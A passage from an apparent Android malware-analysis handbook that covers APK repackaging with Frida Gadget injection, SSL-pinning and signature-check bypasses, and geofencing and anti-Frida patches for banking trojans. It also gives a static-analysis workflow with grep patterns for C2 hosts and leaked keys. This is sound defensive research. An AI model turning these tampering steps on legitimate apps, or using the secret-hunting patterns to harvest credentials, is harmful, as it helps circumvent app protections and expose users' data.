<pre><code>objection patchapk -s target.apk\n</code></pre> <p>This decompiles the APK, injects the Frida Gadget <code>.so</code> into the native library directory, adds a <code>System.loadLibrary</code> call in the entry activity, repackages, and signs. The result is a self-instrumenting APK that spawns a Frida listener on launch without needing frida-server or root.</p> <p>Options:</p> <pre><code>objection patchapk -s target.apk -a arm64-v8a\nobjection patchapk -s target.apk --gadget-version 16.1.0\nobjection patchapk -s target.apk -c gadget-config.json\n</code></pre> <p>The gadget config file controls Frida's behavior (listen mode, script to load, interaction type):</p> <pre><code>{\n  \"interaction\": {\n    \"type\": \"script\",\n    \"path\": \"/data/local/tmp/hook.js\"\n  }\n}\n</code></pre>"},{"location":"reversing/patching/#reflutter-flutter-apps","title":"reflutter (Flutter Apps)","text":"<p>reflutter patches Flutter-based apps to disable SSL pinning and enable traffic interception:</p> <pre><code>reflutter target.apk\n</code></pre> <p>reflutter patches the <code>libflutter.so</code> binary to redirect SSL verification and can also set up a MITM proxy configuration. This is necessary because Flutter apps use their own TLS stack (BoringSSL compiled into <code>libflutter.so</code>) and ignore system-level proxy settings and certificate stores.</p>"},{"location":"reversing/patching/#apklab-vs-code-extension","title":"APKLab (VS Code Extension)","text":"<p>APKLab integrates apktool, jadx, and signing into VS Code. Right-click to decompile, edit Smali with syntax highlighting, and rebuild with one click. Useful for iterative patching workflows where you need to patch, test, and re-patch multiple times.</p>"},{"location":"reversing/patching/#common-pitfalls","title":"Common Pitfalls","text":""},{"location":"reversing/patching/#signature-verification","title":"Signature Verification","text":"<p>Many apps verify their own signature at runtime:</p> <pre><code>PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);\nString sig = info.signatures[0].toCharsString();\nif (!sig.equals(EXPECTED_SIGNATURE)) { System.exit(0); }\n</code></pre> <p>After repackaging with a different key, this check fails. See the Integrity Check Bypass section above for patching strategies, or hook <code>PackageManager.getPackageInfo()</code> via Frida.</p>"},{"location":"reversing/patching/#multi-dex","title":"Multi-DEX","text":"<p>Large apps have multiple DEX files (<code>classes.dex</code>, <code>classes2.dex</code>, etc.). The target code may be in any of them. apktool handles this automatically, but search across all Smali directories:</p> <pre><code>grep -r \"targetMethod\" target_patched/smali*/\n</code></pre>"},{"location":"reversing/patching/#native-integrity-checks","title":"Native Integrity Checks","text":"<p>Native libraries (<code>.so</code> files) may verify DEX checksums or APK signatures. See the Binary Patching section above for handling these with Ghidra or IDA.</p>"},{"location":"reversing/patching/#resource-id-conflicts","title":"Resource ID Conflicts","text":"<p>Modifying resources can shift resource IDs, breaking references. Prefer code-only patches when possible.</p>"},{"location":"reversing/patching/#smali-basics","title":"Smali Basics","text":"<p>Quick reference for reading and writing Smali:</p> Smali Meaning <code>v0</code>, <code>v1</code> Local registers <code>p0</code>, <code>p1</code> Parameter registers (p0 = <code>this</code> for instance methods) <code>const/4 v0, 0x0</code> Set v0 to 0 (false) <code>const/4 v0, 0x1</code> Set v0 to 1 (true) <code>return v0</code> Return value in v0 <code>return-void</code> Return nothing <code>invoke-virtual</code> Call instance method <code>invoke-static</code> Call static method <code>move-result v0</code> Get return value of last invoke <code>if-eqz v0, :label</code> Jump to label if v0 == 0 <code>if-nez v0, :label</code> Jump to label if v0 != 0 <code>goto :label</code> Unconditional jump"},{"location":"reversing/patching/#tools","title":"Tools","text":"Tool Purpose apktool Disassemble/reassemble APKs apksigner Sign APKs (Android SDK) uber-apk-signer Simplified APK signing (zipalign + sign in one step) Ghidra Native code analysis and binary patching Keypatch Binary patching plugin for IDA Objection Automated Frida Gadget injection into APKs reflutter SSL pinning bypass for Flutter apps APKLab VS Code extension integrating apktool, jadx, and signing"},{"location":"reversing/patching/#family-specific-patching-scenarios","title":"Family-Specific Patching Scenarios","text":"<p>Malware analysis often requires patching specific protection mechanisms before analysis can proceed:</p> Family What to Patch Why Chameleon Biometric prompt bypass check Force PIN/password input path to study credential capture mechanism Cerberus lineage Geofencing kill switch Remove CIS country exclusion list to allow execution in analysis environments Klopatra Virbox unpacking stub Patch the native loader to dump DEX before execution, bypassing VM interpretation Brokewell Android 13+ restriction bypass loader Patch the loader's <code>SessionInstaller</code> calls to study the payload directly Frogblight Geofencing check Remove US-avoidance SIM/locale check to allow execution outside Turkey GodFather Post-Soviet language kill switch Patch out system locale check that prevents execution on Russian/Ukrainian devices TrickMo JSONPacker unpacking Patch the custom packer's decryption routine to dump the cleartext payload Mandrake OLLVM control flow flattening Patch branch conditions in native code to linearize execution flow for analysis"},{"location":"reversing/patching/#patching-geofencing","title":"Patching Geofencing","text":"<p>Many banking trojans restrict execution to specific regions. The geofence check typically reads the SIM country code or device locale:</p> <pre><code>invoke-virtual {p0}, Landroid/telephony/TelephonyManager;-&gt;getSimCountryIso()Ljava/lang/String;\nmove-result-object v0\nconst-string v1, \"tr\"\ninvoke-virtual {v0, v1}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z\nmove-result v0\nif-eqz v0, :not_target_country\n</code></pre> <p>To bypass, patch the conditional branch to always proceed, or replace the country code comparison string with your analysis environment's locale.</p>"},{"location":"reversing/patching/#patching-anti-frida-checks","title":"Patching Anti-Frida Checks","text":"<p>Malware detecting Frida (see Hooking) can be patched at the Smali level instead of hooking:</p> <pre><code>.method private checkFrida()Z\n    .locals 1\n    const/4 v0, 0x0\n    return v0\n.end method\n</code></pre> <p>Replace the entire method body with a constant <code>false</code> return. This avoids the cat-and-mouse game of hook-based Frida hiding.</p>"},{"location":"reversing/patching/#when-to-patch-vs-hook","title":"When to Patch vs. Hook","text":"Situation Prefer Persistent change needed Patch Exploring/investigating Hook (Frida) Many checks to bypass Hook (one script, multiple hooks) Native code checks Either (Frida can hook native too) No root access available Patch (works on non-rooted device) App uses integrity verification Hook (avoid signature mismatch) Geofencing / kill switch bypass Patch (one-time removal is cleaner) Frida detection that's hard to hook Patch (remove detection entirely)"},{"location":"reversing/static-analysis/","title":"Static Analysis","text":"<p>Examining an APK without executing it. The first step in any Android reverse engineering workflow: extract the APK, read the manifest, decompile the code, and identify protections, permissions, and interesting code paths.</p> <p>Start with triage, not deep analysis</p> <p>Before spending hours in jadx, run the sample through VirusTotal, APKiD, and a quick manifest review. Five minutes of triage prevents hours of wasted effort on already-documented families or heavily packed samples that require dynamic analysis instead.</p>"},{"location":"reversing/static-analysis/#workflow","title":"Workflow","text":""},{"location":"reversing/static-analysis/#0-virustotal-triage","title":"0. VirusTotal Triage","text":"<p>Before deep analysis, submit the sample to VirusTotal for multi-engine scanning. This provides an immediate overview:</p> <pre><code>Upload APK -&gt; Check detection ratio -&gt; Review vendor names -&gt; Check \"Details\" tab\n</code></pre> <p>What to extract from VT results:</p> Tab What to Look For Detection Detection ratio, family names from ESET/Kaspersky/ThreatFabric, ignore generic \"Trojan.Gen\" verdicts Details Target SDK, signing certificate, embedded file types, APKiD results (packers/obfuscators) Relations Contacted domains/IPs (C2 infrastructure), downloaded files, embedded URLs Behavior Sandbox execution results: permissions requested, network connections, file system activity Community Researcher comments, YARA rule matches, tags <p>Interpreting detection names: different engines name the same family differently. See Naming Conventions for the full cross-vendor mapping. In practice, check ESET, Kaspersky, and Bitdefender names first as they have the most consistent Android family attribution.</p> <p>If the APK is packed, the \"Details\" tab shows APKiD results revealing the packer. Detection counts may be lower for packed samples since engines scan the packer stub, not the actual payload.</p> <p>For VT Intelligence users: search by <code>content:{hash}</code>, <code>imphash:</code>, or behavioral indicators like <code>behaviour_network:domain</code> to find related samples and track campaigns.</p> <p>Low detection does not mean clean</p> <p>A detection ratio of 2/60 does not mean the sample is benign. Packed samples routinely score under 5 detections because engines scan the packer stub, not the payload. Always proceed with manual analysis regardless of the detection count.</p>"},{"location":"reversing/static-analysis/#1-apk-extraction","title":"1. APK Extraction","text":"<p>Get the APK from the device:</p> <pre><code>adb shell pm list packages | grep target\nadb shell pm path com.target.app\nadb pull /data/app/com.target.app-XXX/base.apk\n</code></pre> <p>For split APKs (common on Android 5+):</p> <pre><code>adb shell pm path com.target.app\n</code></pre> <p>Reassemble split APKs before analysis</p> <p>Split APKs distribute code and resources across multiple files. Use <code>bundletool build-apks</code> to reassemble them into a single universal APK, or pull all splits and analyze them together. Missing splits can mean missing DEX files, native libraries, or resources that contain the malicious payload.</p>"},{"location":"reversing/static-analysis/#2-manifest-review","title":"2. Manifest Review","text":"<p>The <code>AndroidManifest.xml</code> reveals the most about an app before looking at code:</p> <pre><code>apktool d base.apk -o output/\ncat output/AndroidManifest.xml\n</code></pre> <p>What to look for:</p> Element Significance <code>&lt;uses-permission&gt;</code> What data/capabilities the app requests <code>&lt;service&gt;</code> with accessibility Indicates potential device control capability <code>&lt;receiver&gt;</code> for BOOT_COMPLETED Persistence mechanism <code>android:exported=\"true\"</code> Components accessible to other apps <code>&lt;provider&gt;</code> without permission Potentially exposed data <code>taskAffinity</code> on activities Possible task hijacking <code>android:debuggable=\"true\"</code> Debug build, easier to instrument <code>android:allowBackup=\"true\"</code> Data extractable via adb backup Custom permissions App-defined access controls"},{"location":"reversing/static-analysis/#manifest-analysis-checklist","title":"Manifest Analysis Checklist","text":"<p>Work through this checklist for every sample. Each item maps to a specific class of malicious behavior.</p> <p>Exported Components</p> <p>Search for <code>android:exported=\"true\"</code> across all <code>&lt;activity&gt;</code>, <code>&lt;service&gt;</code>, <code>&lt;receiver&gt;</code>, and <code>&lt;provider&gt;</code> tags. Any exported component is callable by other apps on the device. Malware exports components intentionally to receive commands from dropper apps or companion packages.</p> <pre><code>grep -n 'exported=\"true\"' output/AndroidManifest.xml\n</code></pre> <p>Intent filters imply exported</p> <p>On Android 12+ (API 31), any component with an <code>&lt;intent-filter&gt;</code> is implicitly exported unless <code>exported=\"false\"</code> is set explicitly. Check intent filters that accept external intents -- these are entry points an attacker or dropper can invoke.</p> <p>Dangerous Application Flags</p> Flag Risk <code>android:debuggable=\"true\"</code> Allows <code>adb</code> to attach a debugger, JDWP access, and runtime inspection. Legitimate release builds never set this. <code>android:allowBackup=\"true\"</code> Allows <code>adb backup</code> to extract application data including shared preferences, databases, and internal files. Malware uses this to exfiltrate data. <code>android:usesCleartextTraffic=\"true\"</code> Permits unencrypted HTTP connections. C2 traffic may use cleartext to avoid certificate issues, making network interception trivial. <p>Service Declarations with Dangerous Bindings</p> <p>These service bindings grant the app powerful device control capabilities. Their presence in malware is a strong indicator of specific attack techniques:</p> Permission What It Grants Related Attack <code>BIND_ACCESSIBILITY_SERVICE</code> Full screen reading, gesture injection, UI interaction Accessibility Abuse <code>BIND_DEVICE_ADMIN</code> Lock screen, wipe device, enforce policies, prevent uninstall Device Admin Abuse <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Read all notifications including OTP codes and banking alerts Notification Listener Abuse <pre><code>grep -n 'BIND_ACCESSIBILITY_SERVICE\\|BIND_DEVICE_ADMIN\\|BIND_NOTIFICATION_LISTENER' output/AndroidManifest.xml\n</code></pre> <p>Permission Declaration vs Usage</p> <p>Compare <code>&lt;uses-permission&gt;</code> declarations against actual API usage in the decompiled code. Malware sometimes declares permissions it does not use in the initial stage -- these are reserved for dynamically loaded payloads. Conversely, missing permission declarations for APIs the code calls indicate the app expects to run with elevated privileges (system app or root).</p> Extracting permissions for comparison <p><pre><code>grep '&lt;uses-permission' output/AndroidManifest.xml | sed 's/.*android:name=\"//' | sed 's/\".*//' | sort &gt; declared_permissions.txt\n\ngrep -rn 'android.permission.' output_java/ | grep -oP 'android\\.permission\\.\\w+' | sort -u &gt; used_permissions.txt\n\ndiff declared_permissions.txt used_permissions.txt\n</code></pre> Permissions that appear only in <code>declared_permissions.txt</code> may be reserved for second-stage payloads loaded at runtime.</p> <p>High-Value Permission Combinations</p> <p>Individual permissions tell you capabilities. Combinations reveal intent:</p> Permission Combination Likely Purpose <code>RECEIVE_SMS</code> + <code>READ_SMS</code> + <code>INTERNET</code> SMS interception and exfiltration (OTP theft) <code>BIND_ACCESSIBILITY_SERVICE</code> + <code>SYSTEM_ALERT_WINDOW</code> Overlay attack capability (credential harvesting) <code>READ_CONTACTS</code> + <code>READ_CALL_LOG</code> + <code>READ_SMS</code> + <code>INTERNET</code> Full communication data harvesting <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>ACCESS_FINE_LOCATION</code> Surveillance/stalkerware profile <code>REQUEST_INSTALL_PACKAGES</code> + <code>INTERNET</code> Dropper/downloader behavior <code>BIND_DEVICE_ADMIN</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> Device takeover -- lock screen, wipe, persistence <code>READ_PHONE_STATE</code> + <code>READ_PHONE_NUMBERS</code> + <code>INTERNET</code> Device fingerprinting and tracking <code>QUERY_ALL_PACKAGES</code> App enumeration -- overlay malware scans for banking targets <p>Custom Permission Definitions</p> <p>Apps can define their own permissions. Look for <code>&lt;permission&gt;</code> declarations:</p> <pre><code>grep -n '&lt;permission ' output/AndroidManifest.xml\n</code></pre> What to Check Risk <code>android:protectionLevel=\"normal\"</code> Any app can request this permission -- no real protection <code>android:protectionLevel=\"dangerous\"</code> Requires user approval but any app can request it <code>android:protectionLevel=\"signature\"</code> Only apps signed with the same key can hold it -- strong if the key is not compromised Missing <code>protectionLevel</code> Defaults to <code>normal</code> -- effectively unprotected <p>Network Security Config</p> <p>If <code>android:networkSecurityConfig</code> is declared in the <code>&lt;application&gt;</code> tag, inspect <code>res/xml/network_security_config.xml</code>:</p> Network security config analysis Element Significance <code>&lt;domain&gt;</code> entries Whitelisted domains -- potential C2 infrastructure <code>cleartextTrafficPermitted=\"true\"</code> on specific domains These domains use HTTP -- trivial to intercept <code>&lt;pin-set&gt;</code> Certificate pinning -- will need bypass for traffic interception <code>&lt;certificates src=\"user\" /&gt;</code> Trusts user-installed CAs -- makes interception easier <code>&lt;certificates src=\"system\" /&gt;</code> only Does not trust user CAs -- requires Frida or system-level bypass <p>Quick manifest dump without apktool</p> <p>When apktool fails on malformed manifests (common with SoumniBot-style obfuscation), use <code>aapt</code> or install the APK on an emulator and dump via <code>adb shell dumpsys package com.target.app</code>.</p>"},{"location":"reversing/static-analysis/#3-decompilation","title":"3. Decompilation","text":""},{"location":"reversing/static-analysis/#decompiler-comparison","title":"Decompiler Comparison","text":"Tool Strengths Weaknesses Best For JADX Best overall decompiler. Handles most samples, good GUI with search and navigation, active development, free Struggles with heavy obfuscation, can be defeated by <code>$JADXBLOCK</code> fields and malformed DEX First-pass decompilation of any APK JEB Pro Best for obfuscated code. Interactive deobfuscation, scripting API, handles anti-decompilation tricks Commercial (expensive license), slower for large apps Heavily obfuscated malware, samples that defeat JADX Ghidra Free, excellent native code analysis, extensible with plugins (D-810 for OLLVM), multi-architecture Steeper learning curve, DEX support is secondary to native <code>.so</code> library analysis, native unpackers, OLLVM-obfuscated code IDA Pro Industry-standard native disassembler, best pseudocode output, largest plugin ecosystem Commercial (very expensive), DEX support requires plugins Production-grade native reversing, Virbox VM interpreter analysis Bytecode Viewer Simultaneous view from multiple decompilers (Procyon, CFR, FernFlower, JADX), good for comparing output Heavier resource usage, less polished UI Cross-referencing decompiler output when one fails apktool Accurate Smali disassembly, resource extraction, APK repackaging, preserves all code structure Smali is harder to read than Java, no high-level decompilation Patching, resource extraction, Smali-level analysis <p>Use multiple decompilers</p> <p>No single decompiler handles every sample perfectly. Start with JADX for readability. If classes are missing or show errors, try JEB Pro or Bytecode Viewer with Procyon/CFR. For GodFather v3 samples with <code>$JADXBLOCK</code> fields, CFR and Procyon ignore the blocking annotation entirely.</p> <p>DEX to Java (readable but imperfect):</p> <pre><code>jadx base.apk -d output_java/\n</code></pre> <p>jadx produces readable Java approximations. Works well for most unprotected apps. Struggles with heavy obfuscation or packed code.</p> <p>DEX to Smali (accurate but harder to read):</p> <pre><code>apktool d base.apk -o output_smali/\n</code></pre> <p>apktool disassembles to Smali (Dalvik assembly). Preserves all code structure. Required for patching.</p>"},{"location":"reversing/static-analysis/#jadx-deep-dive","title":"JADX Deep Dive","text":"<p>jadx is the primary decompilation tool for Android static analysis. Knowing its advanced features significantly accelerates analysis of both clean and obfuscated samples.</p> <p>CLI Options for Batch Analysis</p> Useful jadx CLI flags <pre><code>jadx base.apk -d output/ \\\n  --deobf \\\n  --deobf-min 3 \\\n  --deobf-max 64 \\\n  --show-bad-code \\\n  --threads-count 4 \\\n  --export-gradle\n</code></pre> Flag Purpose <code>--deobf</code> Enable class/method/field renaming for obfuscated code <code>--deobf-min 3</code> Minimum alias length for deobfuscation renames <code>--deobf-max 64</code> Maximum alias length <code>--show-bad-code</code> Output code even when decompilation partially fails -- better than empty stubs <code>--threads-count 4</code> Parallel decompilation for large APKs <code>--export-gradle</code> Export as a Gradle project importable into Android Studio or IntelliJ <p>Dealing with Obfuscated Code</p> <p>When code is obfuscated (short class names like <code>a.b.c</code>, encrypted strings, flattened control flow):</p> <ol> <li>Enable deobfuscation: <code>--deobf</code> assigns readable aliases based on class hierarchy and usage patterns</li> <li>Rename as you go: In JADX-GUI, right-click any class/method/field and rename it (<code>n</code> shortcut). JADX propagates the rename across all references</li> <li>Follow the entry points: Start from manifest-declared components (activities, services, receivers) and trace inward rather than reading bottom-up</li> <li>Identify string decryption stubs: Obfuscated apps typically have one or two methods that all encrypted strings pass through. Find that method, understand the algorithm, and you unlock all strings</li> </ol> <p>Do not trust class names in obfuscated code</p> <p>Obfuscators rename classes to <code>a</code>, <code>b</code>, <code>c</code> etc., but some malware intentionally names classes to mislead -- a class called <code>GooglePlayServices</code> or <code>SecurityUpdate</code> may contain the actual malicious payload. Always verify by reading the code, not the name.</p> <p>Exporting to IDE for Large-Scale Analysis</p> <p>For complex samples with hundreds of classes, export to a Gradle project and analyze in Android Studio or IntelliJ:</p> <pre><code>jadx base.apk --export-gradle -d output_gradle/\n</code></pre> <p>Open the <code>output_gradle/</code> directory as a project in Android Studio. This gives you:</p> <ul> <li>Full IDE search with regex support across all decompiled sources</li> <li>Call hierarchy navigation (find all callers of a method)</li> <li>Type hierarchy (understand class inheritance chains)</li> <li>Refactoring tools for bulk renaming obfuscated symbols</li> <li>Structural search and replace for pattern matching across classes</li> </ul> <p>Gradle export is the best approach for large obfuscated samples</p> <p>When a sample has 500+ classes with single-letter names, JADX-GUI's navigation becomes unwieldy. Android Studio's \"Find Usages\", \"Call Hierarchy\", and \"Go to Implementation\" features make tracing obfuscated call chains far more efficient than scrolling through JADX-GUI tabs.</p> <p>jadx Scripting for Automated Analysis</p> <p>jadx supports scripting plugins for automating repetitive tasks like bulk string decryption:</p> jadx script to find potential string decryption stubs <pre><code>import jadx.core.dex.nodes.ClassNode;\nimport jadx.core.dex.nodes.MethodNode;\n\ngetDecompiler().getClasses().forEach(cls -&gt; {\n    cls.getMethods().forEach(method -&gt; {\n        if (method.getReturnType().toString().equals(\"Ljava/lang/String;\")\n            &amp;&amp; method.getName().length() &lt;= 2\n            &amp;&amp; method.getMethodInfo().getArgumentsTypes().size() &gt;= 1) {\n            log.info(\"Potential decryption stub: \" + cls.getFullName() + \".\" + method.getName());\n        }\n    });\n});\n</code></pre> <p>This approach is especially valuable for DexGuard-protected samples where hundreds of string decryption calls need to be resolved.</p>"},{"location":"reversing/static-analysis/#4-packer-identification","title":"4. Packer Identification","text":"<p>Run APKiD to identify protections:</p> <pre><code>apkid base.apk\n</code></pre> <p>Output reveals:</p> <ul> <li>Packer/protector used (Bangcle, Tencent, Virbox, DexProtector, etc.)</li> <li>Obfuscator (ProGuard, R8, Allatori, etc.)</li> <li>Anti-analysis techniques detected</li> <li>Compiler used</li> </ul> Interpreting APKiD output <p><pre><code>[+] APKiD 2.1.5 :: from RedNaga :: rednaga.io\n[*] base.apk!classes.dex\n |-&gt; compiler : r8\n |-&gt; obfuscator : ProGuard/R8\n[*] base.apk!lib/arm64-v8a/libvdog.so\n |-&gt; packer : Virbox\n |-&gt; anti_vm : Detects virtual environments\n |-&gt; anti_debug : Checks for debugging\n</code></pre> In this example, the DEX itself uses R8 obfuscation, but the presence of <code>libvdog.so</code> identified as Virbox means the real code is virtualized. The DEX decompilation will show only a stub loader.</p> <p>Manual Native Library Identification</p> <p>When APKiD does not recognize the protection, inspect native libraries manually:</p> <pre><code>ls -la lib/arm64-v8a/\nfile lib/arm64-v8a/*.so\nstrings lib/arm64-v8a/*.so | head -50\n</code></pre> <p>Known marker libraries and what they indicate:</p> Library File Packer <code>libvdog.so</code>, <code>libvirbox*.so</code> Virbox <code>libshella.so</code>, <code>libshellx.so</code> Tencent Legu <code>libjiagu*.so</code> Qihoo 360 <code>libdexguard.so</code> DexGuard <code>libdexprotector*.so</code>, <code>libdpboot.so</code> DexProtector <code>libsecexe.so</code>, <code>libSecShell.so</code> Bangcle <code>libcovault-appsec.so</code> AppSealing <p>What to do when you detect a packer</p> <p>If the app is packed, static analysis of the DEX code shows only the packer stub. The real code is encrypted and only available at runtime. Follow the Analysis Decision Tree to select the right unpacking approach, then move to Dynamic Analysis or packer-specific unpacking techniques documented on each Packer page.</p> <p>Also check the Development Frameworks page at this stage. If the APK contains <code>libflutter.so</code>, <code>.dll</code> assemblies, or <code>assets/www/</code>, the framework determines the entire analysis approach -- standard DEX decompilation will produce no useful output for these frameworks.</p>"},{"location":"reversing/static-analysis/#5-string-analysis","title":"5. String Analysis","text":"<p>Strings reveal C2 URLs, API endpoints, encryption keys, and debug messages.</p>"},{"location":"reversing/static-analysis/#quick-extraction","title":"Quick Extraction","text":"<pre><code>strings base.apk | grep -i \"http\"\nstrings base.apk | grep -i \"api\"\n</code></pre>"},{"location":"reversing/static-analysis/#jadx-search-patterns","title":"JADX Search Patterns","text":"<p>In JADX-GUI, use <code>Navigation &gt; Text Search</code> (or <code>Ctrl+Shift+F</code>) to search across all decompiled sources. The following patterns target the most common indicators:</p> <p>C2 URLs and Network Infrastructure</p> <pre><code>https?://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\n</code></pre> <pre><code>/api/\n/gate/\n/panel/\n/bot/\n</code></pre> <p>Search for URL construction patterns</p> <p>Malware authors rarely hardcode full C2 URLs as single strings. Look for string concatenation patterns like <code>\"htt\" + \"ps://\" + domain</code> or <code>StringBuilder</code> chains that assemble URLs at runtime. In JADX, search for partial URL fragments: <code>://</code>, <code>.php</code>, <code>.jsp</code>, <code>/gate</code>, <code>/panel</code>, <code>/bot</code>.</p> <p>API Keys and Credentials</p> <pre><code>[Aa][Pp][Ii][_-]?[Kk][Ee][Yy]\n[Ss][Ee][Cc][Rr][Ee][Tt]\n[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]\nAIza\nAKIA\n</code></pre> <p>Target App Package Names (Overlay Malware)</p> <pre><code>com.android.vending\ncom.google.android.gms\ncom.whatsapp\n</code></pre> <p>Banking trojans that perform overlay attacks contain lists of targeted banking app package names. Search for arrays of strings matching the <code>com.</code> pattern.</p> <p>Cryptographic Constants</p> <pre><code>AES\nDES\nRSA\nCipher.getInstance\nSecretKeySpec\n</code></pre>"},{"location":"reversing/static-analysis/#encrypted-string-identification","title":"Encrypted String Identification","text":"<p>When strings are not readable in the decompiled output, the app likely uses string encryption. Common patterns to identify:</p> <p>Base64-Wrapped Encrypted Strings</p> <p>Look for long Base64 strings passed to decryption methods:</p> <pre><code>String v0 = a.b.c.decrypt(\"dGhpcyBpcyBhIGJhc2U2NCBleGFtcGxl\");\n</code></pre> <p>Search for <code>Base64.decode</code> calls combined with <code>Cipher</code> or custom decryption methods.</p> <p>Byte Array Initialization</p> <p>Encrypted strings often appear as byte arrays in the decompiled code:</p> <pre><code>byte[] v0 = new byte[]{104, 116, 116, 112, 115, 58, 47, 47};\n</code></pre> <p>These are straightforward to decode. Convert the decimal values to ASCII.</p> Bulk decoding byte arrays with CyberChef <p>Copy the byte values and paste into CyberChef with the \"From Decimal\" recipe. For hex arrays (<code>0x68, 0x74, 0x74, 0x70</code>), use \"From Hex\" instead.</p> <p>DexGuard String Encryption Pattern</p> <p>DexGuard-protected apps have a recognizable pattern: single-character class names (<code>o</code>, <code>oo</code>, <code>ooo</code>) containing static methods that accept an <code>int</code> parameter and return a <code>String</code>. Every encrypted string in the app routes through one of these decryption stubs.</p> <pre><code>String url = oo.o(1247);\nString key = oo.o(1248);\n</code></pre> <p>Automating string decryption</p> <p>For Antidot, DexGuard, and similar encryption schemes, write a Frida script that hooks the decryption method and logs every call with its return value. This bulk-decrypts all strings at runtime without reversing the algorithm. See Hooking for Frida string interception patterns.</p>"},{"location":"reversing/static-analysis/#grep-patterns-for-bulk-ioc-extraction","title":"Grep Patterns for Bulk IoC Extraction","text":"<p>These patterns work against decompiled jadx output or <code>strings</code> output from the raw APK. Run them against the jadx output directory for best coverage.</p> URL, IP, and network infrastructure <pre><code>grep -rEo 'https?://[a-zA-Z0-9./?=_&amp;%-]+' output_java/\n\ngrep -rEo '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' output_java/\n\ngrep -rEo '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}:[0-9]{1,5}' output_java/\n\ngrep -rEi '(telegram\\.org/bot|api\\.telegram|t\\.me/)' output_java/\n\ngrep -rEi '\\.(onion|bit|coin|lib|emc)' output_java/\n\ngrep -rEi '(pastebin\\.com|hastebin|ghostbin|rentry)' output_java/\n\ngrep -rEi '(firebase|firebaseio\\.com|googleapis\\.com)' output_java/\n\ngrep -rEi '(ngrok\\.io|serveo\\.net|localtunnel)' output_java/\n</code></pre> API keys, secrets, and credentials <pre><code>grep -rEi '(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|client[_-]?secret)' output_java/\n\ngrep -rEi '(password|passwd|pwd)\\s*=' output_java/\n\ngrep -rEo 'AIza[0-9A-Za-z_-]{35}' output_java/\n\ngrep -rEo 'AKIA[0-9A-Z]{16}' output_java/\n\ngrep -rEo 'ghp_[0-9a-zA-Z]{36}' output_java/\n</code></pre> Crypto constants and encoded data <pre><code>grep -rEi '(SecretKeySpec|Cipher\\.getInstance|MessageDigest)' output_java/\n\ngrep -rEo '\"[A-Za-z0-9+/]{40,}={0,2}\"' output_java/\n\ngrep -rEi 'BEGIN (RSA |EC )?(PRIVATE|PUBLIC) KEY' output_java/\n</code></pre> Target app package names (overlay malware) <pre><code>grep -rEo 'com\\.[a-z]+\\.[a-z.]+' output_java/ | sort -u | head -100\n\ngrep -rEi '(chase|wellsfargo|bankofamerica|citibank|paypal|venmo|cashapp|coinbase|binance|metamask)' output_java/\n</code></pre> <p>APKLeaks automates much of this extraction:</p> <pre><code>apkleaks -f base.apk\n</code></pre>"},{"location":"reversing/static-analysis/#6-resource-analysis","title":"6. Resource Analysis","text":"<p>Resources (<code>res/</code>) can contain:</p> Resource Contains <code>res/xml/</code> Network security config, accessibility config, file provider paths <code>res/raw/</code> Embedded files, encrypted payloads, configuration <code>assets/</code> Native libraries, packed DEX files, web content for overlays <code>res/values/strings.xml</code> Hardcoded strings, sometimes sensitive <p>The network security config (<code>res/xml/network_security_config.xml</code>) reveals certificate pinning configuration and trusted CAs.</p> <p>Check assets for encrypted payloads</p> <p>The <code>assets/</code> directory is the most common location for encrypted second-stage payloads. Look for files with high entropy, no recognizable file headers, or unusual extensions (<code>.dat</code>, <code>.bin</code>, <code>.enc</code>). Run <code>file</code> on every asset to identify embedded DEX, ELF, or ZIP files that the packer renamed.</p>"},{"location":"reversing/static-analysis/#7-native-code","title":"7. Native Code","text":"<p>If the APK contains <code>.so</code> files in <code>lib/</code>:</p> <pre><code>file lib/arm64-v8a/libnative.so\n</code></pre> <p>Native libraries may contain:</p> <ul> <li>Unpacking logic (common in packed apps)</li> <li>Anti-tampering checks</li> <li>Cryptographic operations</li> <li>JNI bridges to obfuscated functionality</li> </ul> <p>Use Ghidra, IDA Pro, or Binary Ninja for native code analysis. Function names are often stripped, requiring pattern matching and dynamic analysis to map functionality.</p> <p>Check JNI_OnLoad first</p> <p>When analyzing native libraries, start with <code>JNI_OnLoad</code> -- this is called when the library loads and is where most malware registers its native methods dynamically. If native methods are registered via <code>RegisterNatives</code> rather than following the standard JNI naming convention, you need to trace the registration table to map Java method names to native function pointers.</p> Listing exported JNI functions <p><pre><code>readelf -Ws lib/arm64-v8a/libnative.so | grep -i java\nnm -D lib/arm64-v8a/libnative.so | grep -i java\n</code></pre> If these commands return nothing, the library uses dynamic registration via <code>RegisterNatives</code> in <code>JNI_OnLoad</code>. Load it in Ghidra and search for cross-references to <code>RegisterNatives</code>.</p>"},{"location":"reversing/static-analysis/#family-specific-static-analysis-notes","title":"Family-Specific Static Analysis Notes","text":"<p>Different malware families present unique static analysis challenges. The table below maps families to their specific obstacles and recommended approaches:</p> Family Challenge Approach FluHorse Business logic compiled as Dart AOT snapshot in <code>libapp.so</code>, not in DEX Use Blutter or reFlutter to analyze Dart snapshots. Standard DEX decompilers show only a thin Kotlin wrapper. SoumniBot Manifest obfuscation crashes jadx and apktool Use Android OS itself as the parser (install on emulator, dump manifest via <code>adb shell dumpsys package</code>). Or patch the malformed ZIP entries manually. GodFather v3 <code>$JADXBLOCK</code> fields in class files + ZIP manipulation Remove <code>$JADXBLOCK</code> annotations from DEX before feeding to jadx. Use alternative decompilers (Procyon, CFR) that may not honor this field. Mandrake OLLVM-obfuscated native libraries Use D-810 Ghidra plugin for OLLVM deobfuscation. Pair with Frida Stalker for runtime instruction tracing. Necro Payload hidden in PNG steganography Extract pixel data from downloaded PNGs, decode hidden DEX using the loader's algorithm. Check <code>BitmapFactory</code> usage patterns. Klopatra Virbox packer virtualizes DEX into proprietary bytecode Static analysis fails entirely for virtualized methods. Must use dynamic analysis and hook the VM interpreter. See Virbox. DexGuard-protected String encryption, class encryption, resource encryption Search for single-character class names (<code>o</code>, <code>oo</code>, <code>ooo</code>) with 